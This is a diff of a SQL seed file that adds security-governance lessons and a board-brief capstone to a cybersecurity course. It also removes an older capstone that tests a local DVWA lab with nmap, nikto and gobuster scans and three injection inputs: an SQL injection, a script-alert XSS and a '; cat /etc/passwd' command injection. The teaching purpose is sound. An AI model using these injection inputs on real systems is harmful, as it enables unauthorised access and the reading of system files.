+| **Patch compliance** | Percentage of systems with current patches |
+| **Vulnerability age** | Average time vulnerabilities remain open |
+
+## Key Takeaways
+
+- Penetration testing types: black box (no info), white box (full info), grey box (partial).
+- Rules of engagement define scope, methods, and boundaries before testing begins.
+- SOC 2 Type II is the gold standard for third-party assurance.
+- Track MTTD, MTTR, and dwell time as key security effectiveness metrics.
+$md$, 30, 1),
+
+('b0000000-0000-4000-8000-000000000065', 'Security Operations Management',
+ 'Investigations, evidence handling, DR, change management, and resource protection at CISSP level.',
+$md$
+# Security Operations Management
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe investigation types and evidence handling requirements.
+- Explain disaster recovery planning, testing, and site types.
+- Describe change and configuration management at enterprise scale.
+- Explain resource protection and media management.
+
+## Investigations
+
+| Investigation Type | Standard of Proof | Led By |
+|-------------------|------------------|--------|
+| **Administrative** | Preponderance of evidence | HR/management |
+| **Civil** | Preponderance of evidence | Legal |
+| **Criminal** | Beyond reasonable doubt | Law enforcement |
+| **Regulatory** | Varies by regulation | Regulatory body |
+
+### Evidence Handling
+
+- **Chain of custody** — documents who handled evidence, when, and what they did. Any break in the chain may render evidence inadmissible.
+- **Order of volatility** — collect most volatile evidence first: CPU registers → cache → RAM → disk → remote logs → backups.
+- **Legal hold** — preserve all potentially relevant data when litigation is anticipated.
+
+## Disaster Recovery
+
+### Recovery Metrics
+
+| Metric | Definition |
+|--------|-----------|
+| **RPO** (Recovery Point Objective) | Maximum acceptable data loss (e.g. 4 hours = last backup must be ≤ 4 hours old) |
+| **RTO** (Recovery Time Objective) | Maximum acceptable downtime (e.g. 2 hours = must be operational within 2 hours) |
+| **MTBF** (Mean Time Between Failures) | Average time between system failures |
+| **MTTR** (Mean Time to Repair) | Average time to restore after failure |
+
+### Recovery Sites
+
+| Type | Cost | RTO | Description |
+|------|------|-----|-------------|
+| **Hot site** | Highest | Minutes to hours | Fully equipped, data replicated, ready to operate |
+| **Warm site** | Medium | Hours to days | Equipment in place, needs data and configuration |
+| **Cold site** | Lowest | Days to weeks | Empty facility with power and connectivity |
+| **Cloud-based** | Variable | Minutes to hours | IaaS/DRaaS; spin up infrastructure on demand |
+
+### DR Testing
+
+| Test Type | Description | Disruption |
+|-----------|-------------|-----------|
+| **Tabletop** | Discussion-based walkthrough of a scenario | None |
+| **Simulation** | Enact the scenario without affecting production | Minimal |
+| **Parallel** | Activate DR site while primary remains running | Minimal |
+| **Full interruption** | Shut down primary and operate from DR site | Significant |
+
+## Change and Configuration Management
+
+**Change management** ensures all modifications to production systems are controlled:
+1. Request → 2. Risk assessment → 3. CAB review → 4. Approval → 5. Implementation → 6. Verification → 7. Documentation.
+
+**Configuration management** maintains a known, documented baseline:
+- **Configuration items (CIs)** — tracked in a CMDB (Configuration Management Database).
+- **Baseline** — the approved configuration state.
+- **Drift detection** — automated scanning for deviations from baseline.
+
+## Key Takeaways
+
+- Investigations: criminal requires "beyond reasonable doubt"; chain of custody must be unbroken.
+- RPO = acceptable data loss; RTO = acceptable downtime. Hot site = fastest recovery.
+- DR tests range from tabletop (no disruption) to full interruption (maximum realism).
+- Change management controls modifications; configuration management maintains baselines.
+$md$, 35, 2),
+
+('b0000000-0000-4000-8000-000000000065', 'Incident Management from a Leadership Perspective',
+ 'IR planning, communication, regulatory notification, and post-incident review for CISM.',
+$md$
+# Incident Management from a Leadership Perspective
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Design an incident response plan from a management perspective.
+- Describe communication plans for incidents (internal, external, regulatory, media).
+- Explain regulatory notification requirements.
+- Conduct effective post-incident reviews.
+
+## IR Planning at the Management Level
+
+As a security leader, your IR plan must address not just technical response but organisational readiness:
+
+### IR Plan Components
+
+| Component | Description |
+|-----------|-------------|
+| **Governance** | IR policy approved by the board; roles and authority defined |
+| **Roles and responsibilities** | IR manager, technical lead, communications lead, legal, HR, executive sponsor |
+| **Classification** | Severity levels (P1–P4) with escalation criteria and SLAs |
+| **Communication plan** | Who is notified, when, how, and by whom |
+| **Third-party coordination** | Retainer with IR firm, law enforcement contacts, cyber insurance carrier |
+| **Training and exercises** | Annual tabletop exercises involving executives and board members |
+| **Budget** | IR retainer, tools, training, insurance |
+
+## Communication During Incidents
+
+| Audience | When | Who Communicates | Key Message |
+|----------|------|-----------------|-------------|
+| **IR team** | Immediately | IR manager | Technical details, assignments |
+| **Executive leadership** | Within 1 hour (P1) | CISO | Business impact, actions being taken |
+| **Board of directors** | Within 24 hours (significant incidents) | CISO/CEO | Scope, impact, regulatory exposure |
+| **Employees** | When needed | Communications/HR | What happened, what to do (e.g. change passwords) |
+| **Customers** | As required by law/contract | Communications/Legal | What happened, what data was affected, what you are doing |
+| **Regulators** | Per regulatory timeline | Legal/DPO | Formal notification with required details |
+| **Media** | If public exposure is likely | PR/Communications | Prepared statement, consistent messaging |
+
+## Regulatory Notification
+
+| Regulation | Notification Deadline | Requirement |
+|-----------|----------------------|-------------|
+| **GDPR** | 72 hours | Notify supervisory authority; notify individuals if high risk |
+| **HIPAA** | 60 days | Notify HHS, affected individuals, and media (if > 500 individuals) |
+| **PCI DSS** | "Immediately" | Notify acquiring bank and card brands |
+| **NIS2** (EU) | 24 hours initial, 72 hours full | Notify national CSIRT |
+
+## Post-Incident Review (Lessons Learned)
+
+Conduct within 1–2 weeks of incident closure. Purpose: improve, not blame.
+
+### Review Structure
+
+1. **Timeline** — what happened, when, in what order.
+2. **What went well** — identify effective actions.
+3. **What needs improvement** — identify gaps (detection, response, communication).
+4. **Root cause** — why did this happen? (technical cause and process/people cause).
+5. **Action items** — specific, assigned, with deadlines.
+6. **Metrics** — MTTD, MTTR, scope, impact quantification.
+
+### Reporting to the Board
+
+Translate technical details into business language:
+- **What happened** — one sentence, no jargon.
+- **Business impact** — financial, operational, reputational, regulatory.
+- **Root cause** — why, at a process/policy level.
+- **What we are doing** — actions taken and planned.
+- **Investment needed** — budget request with ROI framing.
+
+## Key Takeaways
+
+- IR planning at the leadership level covers governance, roles, communication, third parties, and budget.
+- Communication plans must address all audiences: internal team, executives, board, regulators, customers, media.
+- Know the major regulatory notification deadlines: GDPR 72h, HIPAA 60d, NIS2 24h.
+- Post-incident reviews improve the programme — focus on root cause and action items, not blame.
+$md$, 30, 3);
+
+-- ========== BH-ADV: Module 6 — Information Security Programme and Governance ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000066', 'Information Security Programme Management',
+ 'Programme resources, budgeting, maturity models, metrics, and stakeholder management for CISM.',
+$md$
+# Information Security Programme Management
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe the components of an information security programme.
+- Explain programme budgeting and resource allocation.
+- Describe maturity models and how to measure programme maturity.
+- Define programme metrics and reporting.
+
+## Programme Components
+
+An information security programme is the overarching structure that organises all security activities:
+
+| Component | Description |
+|-----------|-------------|
+| **Charter** | Document authorising the programme, signed by executive leadership |
+| **Strategy** | 3–5 year roadmap aligned to business objectives |
+| **Policies and standards** | Governance documents that define expectations |
+| **Architecture** | Security technology stack and integration |
+| **Operations** | Day-to-day security activities (SOC, vulnerability management, IAM) |
+| **Training and awareness** | Educating all employees and specialised training for security staff |
+| **Compliance** | Mapping to regulatory and contractual obligations |
+| **Metrics and reporting** | Measuring effectiveness and communicating to stakeholders |
+
+## Budgeting and Resource Allocation
+
+### Budget Categories
+
+| Category | Examples |
+|----------|---------|
+| **Personnel** | Salaries, contractors, training, certifications (often 60-70% of budget) |
+| **Technology** | SIEM, EDR, vulnerability scanner, IAM, DLP, WAF licences |
+| **Services** | Penetration testing, IR retainer, managed security services, cyber insurance |
+| **Compliance** | Audit fees, certification costs |
+| **Projects** | Zero trust migration, SIEM upgrade, DLP deployment |
+
+### Building a Business Case
+
+Frame security spending in business terms:
+- **Risk reduction** — "This control reduces the likelihood of a $5M data breach by 60%."
+- **Compliance** — "This investment is required to maintain PCI DSS certification."
+- **Efficiency** — "Automating this process saves 20 analyst-hours per week."
+- **Competitive advantage** — "SOC 2 certification enables us to close enterprise deals."
+
+## Maturity Models
+
+### CMMI (Capability Maturity Model Integration)
+
+| Level | Name | Description |
+|-------|------|-------------|
+| 1 | **Initial** | Ad hoc, reactive, unpredictable |
+| 2 | **Managed** | Basic processes defined and followed for projects |
+| 3 | **Defined** | Organisation-wide standards and processes |
+| 4 | **Quantitatively Managed** | Measured with metrics; data-driven decisions |
+| 5 | **Optimising** | Continuous improvement based on quantitative feedback |
+
+Most organisations start at Level 1–2. Level 3 is a good medium-term target. Level 5 is aspirational.
+
+## Programme Metrics
+
+| Metric | Measures | Target Direction |
+|--------|---------|-----------------|
+| **Patch compliance rate** | % of systems with current patches | ↑ Higher is better |
+| **Vulnerability MTTR** | Average days to remediate by severity | ↓ Lower is better |
+| **Security awareness completion** | % of employees who completed training | ↑ Higher is better |
+| **Phishing click rate** | % of employees who click simulated phishing | ↓ Lower is better |
+| **MTTD / MTTR** | Detection and response speed | ↓ Lower is better |
+| **Audit findings** | Number of open audit findings | ↓ Lower is better |
+| **Risk register coverage** | % of business units with current risk assessments | ↑ Higher is better |
+
+## Key Takeaways
+
+- A security programme needs a charter, strategy, policies, operations, training, compliance, and metrics.
+- Personnel is typically the largest budget item (60-70%).
+- Frame security budgets as risk reduction, compliance, or efficiency to gain executive buy-in.
+- Use maturity models (CMMI) to measure and communicate programme progress.
+$md$, 30, 1),
+
+('b0000000-0000-4000-8000-000000000066', 'Governance Frameworks: COBIT and ISO 27001',
+ 'COBIT 2019 and ISO 27001 implementation at management level for CISSP and CISM.',
+$md$
+# Governance Frameworks: COBIT and ISO 27001
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe COBIT 2019 and its governance system components.
+- Explain ISO 27001 and the ISMS lifecycle.
+- Compare COBIT, ISO 27001, and NIST CSF and when to use each.
+- Describe ISO 27001 certification and audit process.
+
+## COBIT 2019
+
+COBIT (Control Objectives for Information and Related Technologies) is an IT governance framework developed by ISACA. It aligns IT with business objectives.
+
+### Key Components
+
+| Component | Description |
+|-----------|-------------|
+| **Governance system principles** | Six principles: provide stakeholder value, holistic approach, dynamic governance system, distinct governance from management, tailored to enterprise needs, end-to-end |
+| **Governance and management objectives** | 40 processes organised into 5 domains |
+| **Components of the governance system** | Processes, organisational structures, policies, culture, information, services/infrastructure, people/skills |
+
+### COBIT Domains
+
+| Domain | Focus | Example Objectives |
+|--------|-------|-------------------|
+| **EDM** (Evaluate, Direct, Monitor) | Governance | Ensure governance framework, value delivery, risk optimisation |
+| **APO** (Align, Plan, Organise) | Management | Strategy, enterprise architecture, innovation, budgets, HR |
+| **BAI** (Build, Acquire, Implement) | Management | Solutions, changes, assets, configuration |
+| **DSS** (Deliver, Service, Support) | Management | Operations, service requests, problems, security, controls |
+| **MEA** (Monitor, Evaluate, Assess) | Management | Performance, compliance, assurance |
+
+### COBIT vs NIST CSF vs ISO 27001
+
+| Framework | Focus | Best For |
+|-----------|-------|----------|
+| **COBIT** | IT governance and management | Aligning IT with business; CISO reporting to board |
+| **NIST CSF** | Cybersecurity risk management | Organising security programme around Identify/Protect/Detect/Respond/Recover |
+| **ISO 27001** | Information security management system | Certification; demonstrating security to customers and regulators |
+
+They are complementary, not competing. Many organisations use ISO 27001 for certification, NIST CSF for security programme structure, and COBIT for IT governance.
+
+## ISO 27001
+
+ISO 27001 is the international standard for Information Security Management Systems (ISMS). It specifies requirements for establishing, implementing, maintaining, and continually improving an ISMS.
+
+### ISMS Lifecycle (Plan-Do-Check-Act)
+
+| Phase | Activities |
+|-------|-----------|
+| **Plan** | Define scope, risk assessment methodology, risk treatment plan, Statement of Applicability (SoA) |
+| **Do** | Implement controls, awareness training, operate the ISMS |
+| **Check** | Internal audits, management reviews, monitoring and measurement |
+| **Act** | Corrective actions, continual improvement |
+
+### Annex A Controls
+
+ISO 27001 Annex A (aligned with ISO 27002) contains 93 controls in 4 categories:
+
+| Category | Count | Examples |
+|----------|-------|---------|
+| **Organisational** | 37 | Information security policies, roles, supplier relationships |
+| **People** | 8 | Screening, awareness, disciplinary process |
+| **Physical** | 14 | Physical entry controls, equipment protection |
+| **Technological** | 34 | Access rights, cryptography, logging, network security |
+
+The Statement of Applicability (SoA) lists all 93 controls and states which are applicable, which are implemented, and which are excluded (with justification).
+
+### Certification
+
+1. **Stage 1 audit** — documentation review (ISMS design).
+2. **Stage 2 audit** — operational effectiveness (evidence of implementation).
+3. **Certificate** — valid for 3 years.
+4. **Surveillance audits** — annual check that the ISMS is maintained.
+5. **Re-certification** — full audit every 3 years.
+
+## Key Takeaways
+
+- COBIT governs IT alignment with business; ISO 27001 certifies security management; NIST CSF organises cybersecurity.
+- COBIT has 40 processes across 5 domains (EDM, APO, BAI, DSS, MEA).
+- ISO 27001 uses Plan-Do-Check-Act with 93 Annex A controls.
+- ISO 27001 certification requires Stage 1 (design) and Stage 2 (effectiveness) audits.
+$md$, 35, 2);
+
+-- ========== STANDALONE CAPSTONE MODULES (updated order_index) ==========
 INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
   ('b0000000-0000-4000-8000-000000000071', 'a0000000-0000-4000-8000-000000000001', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
-  ('b0000000-0000-4000-8000-000000000072', 'a0000000-0000-4000-8000-000000000002', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
-  ('b0000000-0000-4000-8000-000000000073', 'a0000000-0000-4000-8000-000000000003', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 4),
-  ('b0000000-0000-4000-8000-000000000074', 'a0000000-0000-4000-8000-000000000004', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
-  ('b0000000-0000-4000-8000-000000000075', 'a0000000-0000-4000-8000-000000000005', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 3),
-  ('b0000000-0000-4000-8000-000000000076', 'a0000000-0000-4000-8000-000000000006', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 3),
-  ('b0000000-0000-4000-8000-000000000077', 'a0000000-0000-4000-8000-000000000007', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 3);
+  ('b0000000-0000-4000-8000-000000000072', 'a0000000-0000-4000-8000-000000000002', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 6),
+  ('b0000000-0000-4000-8000-000000000073', 'a0000000-0000-4000-8000-000000000003', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
+  ('b0000000-0000-4000-8000-000000000074', 'a0000000-0000-4000-8000-000000000004', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 6),
+  ('b0000000-0000-4000-8000-000000000075', 'a0000000-0000-4000-8000-000000000005', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
+  ('b0000000-0000-4000-8000-000000000076', 'a0000000-0000-4000-8000-000000000006', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 5),
+  ('b0000000-0000-4000-8000-000000000077', 'a0000000-0000-4000-8000-000000000007', 'Capstone Project', 'Hands-on capstone project demonstrating course skills on Kali Linux.', 7);
 
 -- ========== CAPSTONE PROJECTS — ONE PER COURSE ==========
 
@@ -3421,101 +6930,114 @@ $md$, 120, 1);
 
 -- ========== BH-ADV: CAPSTONE ==========
 INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
-('b0000000-0000-4000-8000-000000000077', 'Capstone: Executive Penetration Test Report',
- 'Conduct a full reconnaissance and vulnerability assessment, then write an executive-level report.',
+('b0000000-0000-4000-8000-000000000077', 'Capstone: Security Programme Board Brief',
+ 'Conduct a maturity assessment, build a risk register, draft a 3-year security strategy, and present a board-ready document.',
 $md$
-# Capstone: Executive Penetration Test Report
+# Capstone: Security Programme Board Brief
 
 ## Overview
 
-This is the programme's final capstone. You will conduct a full reconnaissance and vulnerability assessment against a deliberately vulnerable target, then produce a professional penetration test report suitable for executive and technical audiences.
+This is the programme's final capstone. As a future CISO or security leader, you will conduct a maturity assessment of a fictional organisation, build a risk register, draft a 3-year security strategy, and present it in a board-ready document.
 
-**Time estimate:** 2–3 hours
-**Prerequisites:** Kali Linux with Docker; DVWA running (see Kali Setup Guide).
-**Deliverable:** A professional penetration test report PDF.
+This capstone integrates content from across the entire programme: governance, risk management, security architecture, incident management, and programme management.
 
-## Setup
+**Time estimate:** 3–4 hours
+**Prerequisites:** Kali Linux (for system evidence gathering); all prior coursework completed.
+**Deliverable:** A board-ready Security Programme Brief PDF.
 
-Start DVWA:
-```
-sudo docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
-```
-Log in at `http://localhost` (admin / password) and initialise the database.
+## Scenario
+
+You have been appointed as the new Chief Information Security Officer (CISO) of **Meridian Health Group**, a mid-sized healthcare organisation with 2,000 employees across 5 locations. They process patient health records (PHI under HIPAA / POPIA) and accept credit card payments (PCI DSS).
+
+Current state:
+- No formal ISMS or security programme charter.
+- Security is handled reactively by the IT team.
+- Recent ransomware incident caused 3 days of downtime.
+- Board has requested a security improvement plan with budget.
+- Basic firewall and antivirus deployed; no SIEM, no EDR, no vulnerability scanning.
+- No incident response plan, no DR testing.
 
 ## Tasks
 
-### Phase 1 — Reconnaissance (15 marks)
+### Task 1 — Maturity Assessment (20 marks)
 
-Perform host discovery and service enumeration:
+Using the CMMI maturity model, assess the organisation's current maturity level across these domains:
+
+| Domain | Your Assessment (Level 1–5) | Evidence/Justification |
+|--------|---------------------------|----------------------|
+| Asset Management | | |
+| Access Control | | |
+| Vulnerability Management | | |
+| Incident Response | | |
+| Security Monitoring | | |
+| Risk Management | | |
+| Compliance | | |
+| Security Awareness | | |
+
+For each domain, provide a 1–2 sentence justification based on the scenario. Screenshot your completed assessment table.
+
+### Task 2 — Risk Register (20 marks)
+
+Build a risk register with at least 8 risks. Use the following format:
+
+| Risk ID | Risk Description | Likelihood (1-5) | Impact (1-5) | Risk Score | Risk Owner | Treatment | Control |
+|---------|-----------------|-------------------|--------------|-----------|------------|-----------|---------|
+
+Include risks from: ransomware, PHI breach, PCI non-compliance, insider threat, phishing, unpatched systems, no DR capability, and one risk of your choice.
+
+Rate likelihood and impact. Calculate risk score (L × I). Specify treatment: Accept, Mitigate, Transfer, or Avoid. Name a specific control for each.
+
+### Task 3 — Evidence Gathering on Kali (15 marks)
+
+On your Kali Linux system, gather system evidence that demonstrates the type of information a CISO would need when assessing an organisation's security posture:
 
 ```
-nmap -sV -sC -A localhost
+# System information
+uname -a > ~/capstone/system-info.txt
+df -h >> ~/capstone/system-info.txt
+
+# Listening services (attack surface)
+ss -tuln > ~/capstone/services.txt
+
+# Firewall rules
+sudo iptables -L -n > ~/capstone/firewall-rules.txt
+
+# System hardening audit
+sudo lynis audit system --quick > ~/capstone/lynis-report.txt 2>&1
 ```
 
-Take a screenshot. Document:
-- All open ports and services
-- Operating system detected
-- Any additional information from NSE scripts
+Take screenshots of: system info, listening services, firewall rules, and the Lynis hardening index score. Write a 1-paragraph summary of what the evidence tells you about the system's security posture.
 
-### Phase 2 — Vulnerability Scanning (20 marks)
+### Task 4 — Three-Year Security Strategy (25 marks)
 
-Run multiple scanning tools:
+Draft a 3-year security strategy roadmap for Meridian Health Group. Structure it as:
 
-```
-# Nikto web scan:
-nikto -h http://localhost -o ~/capstone/nikto-report.txt
+**Year 1 — Foundation (Quick Wins and Critical Gaps):**
+- List 5 specific initiatives with estimated budget and priority.
+- Must address: incident response plan, vulnerability scanning, security awareness training.
 
-# Nmap vulnerability scripts:
-nmap --script vuln localhost
+**Year 2 — Build (Programme Maturity):**
+- List 4 specific initiatives.
+- Must address: SIEM deployment, DR testing, compliance readiness (HIPAA/PCI DSS).
 
-# Directory enumeration:
-gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt
-```
+**Year 3 — Optimise (Continuous Improvement):**
+- List 3 specific initiatives.
+- Must address: programme metrics, maturity reassessment, advanced detection (EDR/SOAR).
 
-Take a screenshot of each tool's output. List the top 10 findings across all tools.
+For each initiative, specify: description, estimated cost range, responsible role, target maturity level improvement, and alignment to a framework (ISO 27001 control, NIST CSF function, or COBIT objective).
 
-### Phase 3 — Manual Testing (20 marks)
+### Task 5 — Board Brief Document (20 marks)
 
-Manually verify at least **3 vulnerabilities** in DVWA:
+Compile everything into a board-ready document with these sections:
 
-**Test 1 — SQL Injection:**
-Navigate to DVWA → SQL Injection. Input: `1' OR '1'='1`
-Screenshot the result. Explain what happened.
-
-**Test 2 — XSS (Cross-Site Scripting):**
-Navigate to DVWA → XSS (Reflected). Input: `<script>alert('XSS')</script>`
-Screenshot the result. Explain the risk.
-
-**Test 3 — Command Injection:**
-Navigate to DVWA → Command Injection. Input: `; cat /etc/passwd`
-Screenshot the result. Explain what happened and why this is critical.
-
-### Phase 4 — Executive Report (45 marks)
-
-Produce a penetration test report with these sections:
-
-**1. Cover Page:** Project name, target, date, your name, "CONFIDENTIAL".
-
-**2. Executive Summary** (half page): Written for a non-technical CEO. Summarise the overall risk level, key findings, and the single most important recommendation.
-
-**3. Methodology:** Briefly describe the tools and approach used (3–5 sentences).
-
-**4. Findings Table:**
-
-| # | Vulnerability | CVSS | Severity | Impact | Remediation |
-|---|--------------|------|----------|--------|-------------|
-
-Include at least 5 findings rated by CVSS.
-
-**5. Detailed Technical Findings:** For each of the 3 manually verified vulnerabilities, include:
-- Description
-- Evidence (screenshot)
-- Impact
-- Remediation steps
-
-**6. Prioritised Recommendations:** List 5 recommendations in priority order with estimated effort (quick win / medium / long-term).
-
-**7. Conclusion:** 2–3 sentences summarising the engagement and next steps.
+1. **Cover Page:** "Information Security Programme Brief — Meridian Health Group", date, your name as CISO, "CONFIDENTIAL — BOARD OF DIRECTORS".
+2. **Executive Summary** (1 page max): Current state assessment, top 3 risks, proposed investment, expected outcome. Written for non-technical board members.
+3. **Maturity Assessment Summary:** Visual or table showing current vs target maturity.
+4. **Top Risks:** Risk register summary with the 5 highest-scoring risks.
+5. **Strategic Roadmap:** Year 1 / Year 2 / Year 3 with initiatives, budget, and timeline.
+6. **Investment Request:** Total 3-year budget request with breakdown by year and category (personnel, technology, services).
+7. **Framework Alignment:** State which frameworks will be adopted (ISO 27001, NIST CSF, COBIT) and why.
+8. **Appendix:** Full risk register, Lynis report screenshots, detailed initiative list.
 
 ---
 
@@ -3523,21 +7045,12 @@ Include at least 5 findings rated by CVSS.
 
 | Section | Marks | Criteria |
 |---------|-------|----------|
-| Phase 1: Recon | 15 | nmap output shown; services and OS documented |
-| Phase 2: Scanning | 20 | All 3 tools run; top 10 findings listed |
-| Phase 3: Manual testing | 20 | 3 vulns verified; explanations accurate; fixes stated |
-| Executive summary | 10 | Written for non-technical audience; risk level clear |
-| Findings table | 10 | 5+ findings; CVSS scores reasonable |
-| Technical details | 10 | Evidence, impact, and remediation for each manual test |
-| Recommendations | 10 | 5 prioritised; effort estimated |
-| Report professionalism | 5 | Cover page; clear structure; correct naming |
+| Task 1: Maturity Assessment | 20 | All 8 domains assessed; levels justified; realistic for the scenario |
+| Task 2: Risk Register | 20 | 8+ risks; L/I/Score calculated; treatments and controls appropriate |
+| Task 3: Evidence Gathering | 15 | All 4 commands run; screenshots provided; summary paragraph insightful |
+| Task 4: Strategy Roadmap | 25 | 12 initiatives across 3 years; budget estimated; framework aligned |
+| Task 5: Board Brief | 20 | Executive summary clear; professional format; investment quantified |
 | **Total** | **100** | |
-
-## Cleanup
-
-```
-sudo docker stop dvwa && sudo docker rm dvwa
-```
 
 ## Submission
 
